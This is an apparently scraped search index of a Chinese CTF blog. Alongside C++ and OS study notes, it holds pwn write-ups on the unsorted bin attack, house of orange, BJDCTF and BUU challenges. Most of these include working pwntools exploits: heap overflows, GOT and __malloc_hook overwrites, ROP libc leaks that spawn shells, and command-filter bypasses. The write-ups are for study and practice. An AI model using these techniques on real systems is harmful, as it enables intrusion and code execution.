print(&quot;[*] libc_base : &quot;,hex(libc_base)) system_addr = libc_base + libc.dump('system') print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr)) payload = p64(system_addr) edit(1,payload) free(0) p.interactive() ","link":"https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/"},{"title":"C++学习","content":"由于最近学校开了数据结构，而且是以c++语言来描述，由于本菜鸡转专业并没有接触过c++，特此来补习一下，暂停PHP的学习。 类 简单立方体类设计 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Cube{ private: int m_L; int m_H; int m_W; public: //设置长宽高 void set_L(int l) { m_L = l; } void set_H(int h) { m_H = h; } void set_W(int w) { m_W = w; } //获取长宽高 int get_L() { return m_L; } int get_H() { return m_H; } int get_W() { return m_W; } //获取面积 int get_area() { return 2 * (m_L * m_W + m_L * m_H + m_H * m_W); } //获取体积 int get_volume() { return m_W * m_L * m_H; } // 成员函数判断两个立方体是否相等 bool isSame(Cube &amp;c1) { if(m_H == c1.get_H() &amp;&amp; m_W == c1.get_W() &amp;&amp; m_L == c1.get_L()) { return true; } else return false; } }; //全局函数判断两个立方体是否相等 /* bool isSame(Cube &amp;c1,Cube &amp;c2) { if(c1.get_H() == c2.get_H() &amp;&amp; c1.get_W() == c2.get_W() &amp;&amp; c1.get_L() == c2.get_L()) { return true; } else return false; } */ int main(int argc, char const *argv[]) { Cube c1,c2; c1.set_W(10); c1.set_H(10); c1.set_L(10); c2.set_W(20); c2.set_L(20); c2.set_H(20); cout &lt;&lt; &quot;c1的长宽高为：&quot; &lt;&lt; c1.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c2的长宽高为：&quot; &lt;&lt; c2.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c1的面积和体积：&quot; &lt;&lt; c1.get_area() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_volume() &lt;&lt; endl; /* bool is_s = isSame(c1,c2); if(is_s == true) cout &lt;&lt; &quot;c1和c2相等&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1和c2不相等&quot; &lt;&lt; endl; */ bool is_s = c1.isSame(c2); if(is_s == true) cout &lt;&lt; &quot;c1和c2相等&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1和c2不相等&quot; &lt;&lt; endl; return 0; } ##构造函数和析构函数 初步认识 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; //构造函数和析构函数 //构造函数：创建对象时自动调用 //析构函数：对象销毁时自动调用 class Person { //1.1构造函数 //没有返回值，也不用写void //函数名与类名相同，可以发生重载 public: Person() { cout &lt;&lt; &quot;构造函数自动调用&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;析构函数的调用&quot; &lt;&lt; endl; } }; int main() { Person p1; } 运行结果： 构造函数的分类及调用 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* 两种分类方式： 1，参数分：有参构造和无参构造 2，类型分：普通构造和拷贝构造 三种调用方法： 1，括号法 2，显示法 3，隐式构造法 */ class Person { //构造函数 public: Person() { cout &lt;&lt; &quot;Person的无参构造函数调用（默认构造）&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; } //拷贝构造函数 Person(const Person &amp;p) { //将传入的对象的所有属性 拷贝到‘我’身上 cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; } }; //调用 void test() { //1，括号法 Person p; //默认构造函数调用 Person p1(10);//有参构造函数 Person p2(p1); //2，显示法 //3，隐式转换法 } int main() { test(); } #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* 两种分类方式： 1，参数分：有参构造和无参构造 2，类型分：普通构造和拷贝构造 三种调用方法： 1，括号法 2，显示法 3，隐式构造法 */ class Person { //构造函数 public: Person() { cout &lt;&lt; &quot;Person的无参构造函数调用（默认构造）&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; } //拷贝构造函数 Person(const Person &amp;p) { //将传入的对象的所有属性 拷贝到‘我’身上 cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; } }; //调用 void test() { //1，括号法 // Person p; //默认构造函数调用 // Person p1(10);//有参构造函数 // Person p2(p1); //注意事项：调用默认构造函数的时候，不要加括号（编译器会认为是一个函数的声明） //2，显示法 Person p; Person p2 = Person(10); Person p3 = Person(p2); //等号右侧的部分叫做匿名对象：当前行执行结束后，系统会自动回收掉对象 //3，隐式转换法 } int main() { test(); } 执行结果如上图 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* 两种分类方式： 1，参数分：有参构造和无参构造 2，类型分：普通构造和拷贝构造 三种调用方法： 1，括号法 2，显示法 3，隐式构造法 */ class Person { //构造函数 public: Person() { cout &lt;&lt; &quot;Person的无参构造函数调用（默认构造）&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; } //拷贝构造函数 Person(const Person &amp;p) { //将传入的对象的所有属性 拷贝到‘我’身上 cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; } }; //调用 void test() { //1，括号法 // Person p; //默认构造函数调用 // Person p1(10);//有参构造函数 // Person p2(p1); //注意事项：调用默认构造函数的时候，不要加括号（编译器会认为是一个函数的声明） //2，显示法 // Person p; // Person p1 = Person(10); // Person p2 = Person(p2); //等号右侧的部分叫做匿名对象：当前行执行结束后，系统会自动回收掉对象 //3，隐式转换法、 Person p; Person p1 = 10; Person p2 = p1; } int main() { test(); } 拷贝构造函数的调用时机 #include &lt;iostream&gt; using namespace std; //拷贝函数的调用时机 //1，使用一个已经创建完毕的对象来初始化一个新对象 //2，值传递的方式给函数参数传值 //3，值方式返回局部对象 class Person { public: Person() { cout &lt;&lt; &quot;Person默认构造函数调用&quot; &lt;&lt; endl; } Person(int age) { m_age = age; cout &lt;&lt; &quot;Person有参构造函数调用&quot; &lt;&lt; endl; } Person(const Person &amp; p) { m_age = p.m_age; cout &lt;&lt; &quot;Person拷贝构造函数调用&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;Person析构函数调用&quot; &lt;&lt; endl; } } void method_by_exchange(Person p) { } int main() { //Person p1(20); //Person p2(p1); //cout &lt;&lt; &quot;p2的年龄：&quot; &lt;&lt; p2.m_age &lt;&lt; endl; //2，值传递的方式给函数参数传值 Person p; method_by_exchange(p); } 深拷贝与浅拷贝 浅拷贝带来的问题： #include &lt;iostream&gt; using namespace std; //前置知识：当一个类初始化的时候，啥构造函数都没写，编译器自动提供默认构造和拷贝构造 //要是写了有参构造，编译器自动默认提供拷贝构造 //要是写了拷贝构造，编译器啥都不提供 class Person { public: int m_age; int *m_height; //身高，用指针来做 重点关注这个值 Person() { cout &lt;&lt; &quot;Person的默认构造函数调用&quot; &lt;&lt; endl; } Person(int age,int height) { m_age = age; m_height = new int(height); cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; } ~Person() { if (m_height != NULL) { delete m_height; //如果利用编译器提供的拷贝构造函数，会做浅拷贝操作 //浅拷贝带来的问题：堆区的内存重复释放 //如何解决？？？ 用深拷贝来做，自己写一个拷贝构造函数 m_height = NULL; //double free!!!! } cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; } }; void test1() { Person p1(3,140); cout &lt;&lt; &quot;p1的年龄为&quot; &lt;&lt; p1.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p1的身高为&quot; &lt;&lt; *p1.m_height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2的年龄为&quot; &lt;&lt; p2.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p2的身高为&quot; &lt;&lt; *p2.m_height &lt;&lt; endl; } int main(int argc, char const *argv[]) { test1(); return 0; } 解决问题：深拷贝 #include &lt;iostream&gt; using namespace std; //前置知识：当一个类初始化的时候，啥构造函数都没写，编译器自动提供默认构造和拷贝构造 //要是写了有参构造，编译器自动默认提供拷贝构造 //要是写了拷贝构造，编译器啥都不提供 class Person { public: int m_age; int *m_height; //身高，用指针来做 重点关注这个值 Person() { cout &lt;&lt; &quot;Person的默认构造函数调用&quot; &lt;&lt; endl; } Person(int age,int height) { m_age = age; m_height = new int(height); cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; } //现在我们来写一个拷贝构造函数来解决浅拷贝问题 Person(const Person &amp;p) { m_age = p.m_age; //m_height = p.m_height &lt;---- 这行代码是编译器自动提供的代码，会引起浅拷贝的问题 //深拷贝操作：重新在堆区开辟一块空间！ m_height = new int(*p.m_height); cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; } ~Person() { if (m_height != NULL) { delete m_height; //如果利用编译器提供的拷贝构造函数，会做浅拷贝操作 //浅拷贝带来的问题：堆区的内存重复释放 //如何解决？？？ 用深拷贝来做，自己写一个拷贝构造函数 m_height = NULL; //double free!!!! } cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; } }; void test1() { Person p1(3,140); cout &lt;&lt; &quot;p1的年龄为&quot; &lt;&lt; p1.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p1的身高为&quot; &lt;&lt; *p1.m_height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2的年龄为&quot; &lt;&lt; p2.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p2的身高为&quot; &lt;&lt; *p2.m_height &lt;&lt; endl; } int main(int argc, char const *argv[]) { test1(); return 0; } 初始化列表 #include &lt;iostream&gt; using namespace std; //作用：c++提供了初始化列表语法，用来初始化属性 class Person { public: int m_a,m_b,m_c; public: /* 传统初始化操作 Person(int a,int b,int c) { m_a = a; m_b = b; m_c = c; } */ //初始化列表语法！ Person(int a,int b,int c):m_a(a),m_b(b),m_c(c) { } }; void test() { Person p1 = Person(10,20,30); cout &lt;&lt; &quot;p1的值为：&quot; &lt;&lt; p1.m_a &lt;&lt; ',' &lt;&lt; p1.m_b &lt;&lt; ',' &lt;&lt; p1.m_c &lt;&lt; endl; } int main(int argc, char const *argv[]) { test(); return 0; } 类和对象 类对象作为类成员 B类中有对象A作为成员，A就是对象成员 重点：观察二者的构造和析构的调用顺序 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Phone { public: string mpname; Phone(string pname) { mpname = pname; cout &lt;&lt; &quot;Phone构造函数调用&quot; &lt;&lt; endl; } ~Phone() { cout &lt;&lt; &quot;Phone的析构函数调用&quot; &lt;&lt; endl; } }; class Person { public: string mname; Phone mphone; //本质： Phone mphone = phone; 隐式转换法！！！ Person(string name,string phone):mname(name),mphone(phone) { cout &lt;&lt; &quot;Person构造函数调用&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; } }; void test() { Person p1(&quot;tom&quot;,&quot;huawei&quot;); cout &lt;&lt; &quot;p1的值为：&quot; &lt;&lt; p1.mname &lt;&lt; endl; cout &lt;&lt; p1.mphone.mpname &lt;&lt; endl; } int main() { test(); return 0; } ","link":"https://l3mon629.github.io/post/cxue-xi/"},{"title":"unsorted bin attack","content":"简单说明 基本来源 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。 利用方法： 改unsorted bin 的bk为target-0x10 实现效果： 将target改为一个很大的数值 利用场景： 修改循环的次数来使得程序可以执行多次循环。 修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin。 改_IO_list_all来伪造_IO_FILE进行攻击。 hitcontraining_lab14 题目的edit功能可以改size，实现一个强力的堆溢出，同时题目存在后门，只要改一个bss段的变量大于即可cat flag 思路很简单，堆溢出打掉unsorted bin的bk，连libc都不用泄漏 exp: from pwn import * p = process('./magicheap') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap :',content) def delete(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) add(0x10,'aaaa') add(0x90,'aaaa') add(0x10,'protect') context.log_level = 'debug' target = 0x6020C0 delete(1) payload = p64(0) * 3 + p64(0xa1) + p64(0) + p64(target-0x10) edit(0,0x40,payload) add(0x90,'a') p.recv() p.send('4869') p.interactive() ","link":"https://l3mon629.github.io/post/unsorted-bin-attack/"},{"title":"house of orange学习","content":"house of orange 什么时候用？ 当程序不提供free功能的时候我们选择采用house of orange攻击手法 作用：经过攻击后得到一个unsorted bin 仔细回想一下自己所学，在stack中，大部分攻击手法都类似于栈溢出，目的是为了控制ret的返回地址 在heap中的攻击手法多样，不仅有溢出还有很多攻击手法，但是大多数目的只有一个：控制指针。而free态的堆块天然的给我们提供了一些指针，fastbin的fd，unsorted bin的fd和bk等等等等。通过控制指针，我们可以泄漏内存，可以改写内存，相当于控制了程序的执行流。 我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的_int_malloc函数中，在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。 这样我们就得到了一个unsorted bin 不过，我们得满足一些要求： 1，伪造的 size 必须要对齐到内存页 2，size 要大于 MINSIZE(0x10) 3，size 要小于之后申请的 chunk size + MINSIZE(0x10) 4，size 的 prev inuse 位必须为 1 BookWriter 逆向分析 main函数 read_author函数 add函数，请记住这个count在这里&gt;8 show函数，到了这里，变成数量&gt;7了 edit函数，很诡异的发现有个strlen，存在无00截断漏洞，并且堆块数量&gt;7 edit author函数，同样，框起来的地方也存在无00截断漏洞 bss段上，发现author,heaparray,sizearray是连在一起的 思路 总结一下发现的漏洞点： 1，strlen和printf(&quot;%s&quot;)的无00截断的漏洞 2，add函数和show，edit函数中的关于堆块数量的逻辑漏洞 这两个漏洞可以做到什么呢？ 首先：第一个strlen，如果我们申请0x18的堆块，并且填满所有内容，那么下面的内存布局不是\\x00，而是下一个堆块的size，由于不为空，下面的这一条语句，使得我们的size_array的某一个元素扩大，可以实现少量字节的堆溢出 size_array[v1] = strlen(heap_array[v1]); 第二：printf(&quot;%s&quot;)无00截断，由于author就在heaparray的上方，我们同样的填满author中的内容，可以泄漏出第一个堆块即heaparray[0]的地址 第三：由于add函数中存在count可以多申请一个，即在add函数里面我们可以申请0-8共九个堆块，但是heaparray的大小是8，所以我们的第九个堆块的地址会被记录在sizearray里面，造成了一个威力极大的堆溢出 总思路：利用house of orange得到一个unsorted bin，由于edit author的存在使bss段可写，我们便可以在bss段上伪造一个size能够覆盖heaparray的unsorted bin，然后申请过来，便可以控制heaparray，然后打__malloc_hook 利用漏洞一，我们可以改写topchunk的size，然后申请一个比topchunk大的堆块，实现house of orange，得到一个unsorted bin，然后申请一个小chunk，由于是从unsorted bin里面切下来的，我们就可以show这个小chunk来泄漏libc基址 利用漏洞三，我们申请九次chunk，可以获得一个超大溢出的能力，溢出到unsorted bin（原先的top chunk），然后改写fd和bk，使得真unsorted bin位于队列的前一个位置 利用编辑作者和漏洞二的功能，在bss段伪造一个unsorted bin，同时设置好fd和bk。借助漏洞二可以泄漏heap[0]的基地址，可以辅助来设置fd和bk(当然，设置成main_arena+88也可以，只要设置heap段的那个unsorted bin里面的bk为伪造的unsorted bin即可) 再次利用漏洞一，为了能够再次申请chunk，我们利用编辑功能，编辑0号chunk，的第一个内容为\\x00，这样可以欺骗strlen，将sizearray[0]即heaparray[8]设置为0，我们获得无限申请堆块的能力 申请合适大小的堆块，使得fake unsorted bin脱链，使我们获得在bss段上写入的能力。 写入payload，控制heaparray，攻击__malloc_hook为system地址 exp from pwn import * local = 1 if local == 1: p = process('./bookwriter') else: p = remote('chall.pwnable.tw',10304) elf = ELF('./bookwriter') libc = ELF('./libc-2.23.so') def dbg(): context.log_level = 'debug' def author(name): p.sendafter('Author :',name) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of page :',str(size)) p.sendafter('Content :',content) def show(index): p.sendlineafter('Your choice :','2') p.sendlineafter('Index of page :',str(index)) def edit(index,content): p.sendlineafter('Your choice :','3') p.sendlineafter('Index of page :',str(index)) #p.sendafter('Content :',content) p.recvuntil('Content:') p.send(content) def edit_author(main_arena_88): p.sendlineafter('Your choice :','4') p.recvuntil('Author :') p.recvuntil(b'A' * 64) leak_heap = u64(p.recvuntil('\\x0a',drop = True)[-4:].ljust(8,b'\\x00')) p.sendlineafter('Do you want to change the author ? (yes:1 / no:0)','1') payload = b'/bin/sh\\x00'+p64(0x111)+p64(leak_heap+0x130)+p64(main_arena_88)+p64(0)*4 p.sendafter('Author :',payload) return leak_heap print(&quot;============ bss ============ &quot;) print(&quot;[*] the 'author' is in 0x602060 &quot;) print(&quot;[*] heaparray[] is in 0x6020A0&quot;) print(&quot;[*] sizearray[] is in 0x6020E0&quot;) print(&quot;============ bss ============ &quot;) author(b'A' * 64) add(0x18,b'A' * 0x18) #0 print(&quot;now we still don't use the fun 'edit',so we dont't use strlen&quot;) print(&quot;the next,we use strlen&quot;) #dbg() print(&quot;========= step 1: make top chunk into unsorted bin ============ &quot;) edit(0,b'A' * 0x18) print(&quot;Now, we successfully have haven 3 bytes to overflow&quot;) #dbg() payload = b'\\x00' * 0x18 + b'\\xe1\\x0f\\x00' edit(0,payload) context.log_level = 'info' add(0x1fe1,'A') #1 print(&quot;======== step 2: leak libc address and the heap address =========== &quot;) add(0x10,'A') #2 show(2) #main_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 1569 #print('main_arena leak ---&gt; ' + hex(main_arena)) #p.recv() libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x39c141 #- 88 - 0x10 - libc.sym['__malloc_hook'] print('[*] libc_base ----&gt; ',hex(libc_base)) for i in range(6): add(0x10,'A') main_arena_88 = libc_base + 0x39bb78 print(&quot;forge unsorted bin in author(bss) to control the heaparray &quot;) heap_addr = edit_author(main_arena_88) print('[*] the heaparray[0] ------&gt; ',hex(heap_addr)) print(&quot;=========== step 3: control the heaparray ============ &quot;) print(&quot;to emptify the heaparray[8] (sizearray[0]) ,so we can continue to malloc &quot;) edit(0,p64(0)) #dbg() add(0x30,'AAAAAAAA') author_fake_unsorted_bin = 0x602060 payload = 0x130 * b'\\x00' + p64(0) + p64(0x21) + p64(main_arena_88) + p64(author_fake_unsorted_bin) edit(0,payload) __malloc_hook = main_arena_88 - 88 -0x10 system_addr = libc_base + 0x3f550 add(0x100,48*b'a' + p64(__malloc_hook - 8)) edit(0,p64(0) + p64(system_addr)) p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(author_fake_unsorted_bin)) p.interactive() 收获几个点： 1，一个chunk放入unsorted bin链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此unsorted bin遍历堆块的时候使用的是bk指针。 2，malloc过程复习 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(0x1000); malloc(0x10); q = malloc(0x800); malloc(0x20); free(p); free(q); malloc(0x500); malloc(0x500); } 过程分析：执行完free后p和q都在unsorted bin里，p是头部，q是尾部。 malloc(0x500)时，unsorted bin从q开始遍历，将q和p放到large bins里，然后从large bins里切割q，将剩下的部分再次链入unsorted bin。此时p在large bins，q在unsorted bin。 再次malloc(0x500)时，unsorted bin开始遍历，q不满足要求，被放入small bins，p满足，切割后被放入unsorted bin里，所以最终结果是p在unsorted bin，q在small bins里。 3，关于题目的一些tips，不泄漏堆地址也可以，我们只需要将real unsorted bin的bk改为fake unsorted bin的地址就可以了。 关于__malloc_hook，其实一开始不太理解为什么__malloc_hook可以改为system拿shell，翻了一下源码发现__malloc_hook其实是有参数的，第一个参数是size，第二个参数是指针。但是并没有审到什么时候调用这两个参数，在exp中，我们最后利用__malloc_hook(address)，__malloc_hook的地址被改成了system，address指向的内容是/bin/sh，具体malloc的时候，address是作为size传进去的。个人猜测这个方法不常见的原因大概是大多数的题目对malloc的size是有界限的，不允许malloc大size(address一般都是非常大的值) 参考链接： 深入理解unsorted bin attack：https://xz.aliyun.com/t/7251 glibc源码：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3034 ctf-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/ ","link":"https://l3mon629.github.io/post/house-of-orange-xue-xi/"},{"title":"操作系统","content":" !!!本文暂时停更，等学习完普通的操作系统再来此课程进阶学习 说明：本课程为哈尔滨工业大学李治军老师所开公开课，本文仅作笔记，供复习学习使用 代码部分采用Linux 0.11部分内核代码，实验部分采用实验楼的实验 揭开钢琴的盖子 初始化 打开电源后发生了什么？ 关注ip指针指向的内容，这部分显然由硬件的设计者来决定 x86PC 刚开机的时候cpu处于实模式，按照实模式来寻址，cs左移四位+ip 开机时，CS = 0xFFFF IP = 0x0000 寻址到0xFFFF0，为ROM BIOS映射区（BIOS = basic input output system） 检查RAM，键盘，显示器和软硬磁盘等 将0磁道0扇区读入0x7c00处 设置CS = 0x07c0 IP=0x0000 0x7c00处存放的代码就是从引导扇区读入的那512个字节 bootsec.s 第一部分：将自身，即bootsec由段0x07c0移动到段0x9000，共计256个字，然后跳转到go标号处，即下一条指令继续执行 第二部分：利用BIOS中断INT 0x13将setup模块从磁盘第二个扇区开始读到0x90200处，共读四个扇区 第三部分：setup模块读入后 显示字符信息 操作系统启动 setup.s 第一部分：移动system模块 第二部分：启动保护模式 gdt：global description table 保护模式下的寻址模式：根据cs查表+ip 将system移动到0x0000处 第三部分：跳转到system去执行 ","link":"https://l3mon629.github.io/post/cao-zuo-xi-tong/"},{"title":"[BJDCTF 2nd]pwn题目全解(更新中)","content":"[BJDCTF 2nd]rci 很不错的题目 不需要写exp，直接nc做就行了 逆向分析 main函数，有一个init函数，我们进去看看 在init函数里面，程序首先到/tmp文件夹下面新建了若干文件夹，然后随机选一个文件夹进入，记为“藏有imagin”的文件夹，然后提示我们获得道具ls 在下面我们可以向command写入东西，然后system(command)，但是之前有一个检查check1 我们只能输入a-z和A-Z和“/” “ ” “-”三个特殊字符 接下来是特殊的知识点了，题目考我们关于linux的熟悉度 inode 理解inode，要从文件储存说起。 文件存储在硬盘上，硬盘的最小存储单位叫做“扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。 操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。 文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为&quot;索引节点&quot;。 每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 万物皆文件，文件夹也有其对应的inode号，我们可以通过ls -i查看inode号码 我们开两个shell，然后一个输入 ls -ali 查看当前目录下的inode，然后再另外一个输入ls -ali /tmp，就可以查看tmp文件夹下的inode号，如下图 然后两个inode号相同的就是我们当前所在目录 可以看到我们获得残缺的shell 有个check2进行检查 两种绕过方法，一个是用拼接符&quot;``&quot;,可以拿shell 第二个是用$0来绕过 diff 挺有新意的一个题 ssh登陆服务器 然后提示我们这个程序怎么用，比较两个文件啥的，我们用scp给宕下来 scp -P 29477 ctf@node3.buuoj.cn:/home/ctf/diff /ctf/work/pwn-enclo/ 然后分析一下，保护全关，主要逻辑就是比较两个文件的内容 点进去compare函数 可以发现有个栈溢出 然后print函数可以输出文件一的内容，但是前提是file1=file2，所以我们不能走正常流程，直接栈溢出给劫持到输出file1的地方 payload: babyrop from LibcSearcher import * from pwn import * local = 0 binary = &quot;bjdctf_2020_babyrop&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,28510) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] elf = ELF(binary) # puts(puts@got) puts = elf.got['puts'] puts_plt = elf.plt['puts'] main = elf.sym['main'] offset = 0x28 pop_rdi_ret = 0x0000000000400733 payload = offset * 'a' + p64(pop_rdi_ret) + p64(puts) + p64(puts_plt) + p64(main) # let puts@plt puts puts@got p.recvuntil('Pull up your sword and tell me u story!') p.send(payload) puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libc = LibcSearcher('puts',puts_addr) libc_base = puts_addr - libc.dump('puts') print &quot;[*] libc_base:&quot;,hex(libc_base) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = offset * 'a' + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(0xdeadbeef) p.recvuntil('Pull up your sword and tell me u story!') p.send(payload) #gdb.attach(p) p.interactive() test 过滤了flag，并且flag没有读权限，所以我们只能借用它的test程序来打，有od命令可以用，直接od * ","link":"https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/"},{"title":"buu-pwn(2)","content":"picoctf_2018_got_shell 有意思的题目，也不难，理清楚逻辑就能出 main函数，逻辑是输入一个地址v3存入s 然后输入v4，将v3和v4都输入s 然后v3的值被赋值给v4的地址 程序本身有后门 我们只需要把v3赋值给puts@got，然后把v4的地址赋值给后门地址 然后调用puts的时候，就会调用后门，然后拿到shell exp from pwn import * local = 0 if local == 1: p = process('./PicoCTF_2018_got-shell') else: p = remote('node3.buuoj.cn',28761) elf = ELF('./PicoCTF_2018_got-shell') #libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' p.recvuntil('I\\'ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\\n') payload = hex(elf.got['puts']) p.sendline(payload) backdoor = int(0x0804854B) payload = hex(backdoor) p.sendline(payload) p.interactive() 不知道为什么没开canary，本来应该格式化字符串来做，但是👴直接栈溢出 exp: from pwn import * local = 0 binary = 'mrctf2020_easy_equation' if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',27287) offset = 1 + 0x8 backdoor = 0x4006D0 payload = offset * b'A' + p64(backdoor) p.sendline(payload) p.interactive() wustctf2020_number_game int型的范围在[-2147483648,2147483647]，输入负边界就能绕过判断 [Black Watch 入群题]PWN vul函数 可以溢出两个字长，而且我们可以控制bss段的0x200个字节 直接栈迁移，利用leave指令打bss exp: from pwn import * from LibcSearcher import * binary = './spwn' #libc = ELF('./libc.so.6') local = 0 if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',25304) elf = ELF(binary) def dbg(): context.log_level = 'debug' #dbg() write_plt = elf.plt['write'] main_addr = elf.sym['main'] read_got = elf.got['read'] pop_ebp = 0 payload = p32(pop_ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4) # mov esp,ebp; pop ebp; pop eip; p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) p.sendafter('What do you want to say?',payload) read_addr = u32(p.recv(4)) print hex(read_addr) ''' libc_base = read_addr - libc.sym['read'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() ''' libc = LibcSearcher('read',read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = p32(pop_ebp) + p32(system_addr) + p32(system_addr) + p32(binsh_addr) p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) #addr:level p.sendafter('What do you want to say?',payload) p.interactive() wustctf2020_name_your_dog 挺好玩的一个题目，一开始调试想打printf发现失败了 后来直接打__isoc99_scanf vul函数 可以对我们的dog进行命名，这个逻辑就是以一个bss段为数轴的中心，可以向前向后进行任意地址写7个字节 name函数 直接改掉__isoc99_scanf的got表即可 from pwn import * local = 0 if local == 1: p = process('./wustctf2020_name_your_dog') else: p = remote(&quot;node3.buuoj.cn&quot;,26562) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] elf = ELF('./wustctf2020_name_your_dog') #offset_printf_dog = -10 #(scanf@got - 0x804A060) = -56 payload0 = -7 p.sendlineafter('&gt;',str(payload0)) backdoor = 0x080485CB payload1 = p32(backdoor) p.sendlineafter('Give your name plz:',payload1) p.interactive() bjdctf_2020_YDSneedGrirlfriend 跟pwnable的note一摸一样，就是把note数量改成了杨师傅的女朋友数量。 三分钟写好exp一把🔒 from pwn import * local = 0 if local == 1: p = process('./bjdctf_2020_YDSneedGrirlfriend') else: p = remote(&quot;node3.buuoj.cn&quot;,29951) def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Her name size is :',str(size)) p.sendafter('Her name is :',content) def show(index): p.sendlineafter('Your choice :','3') 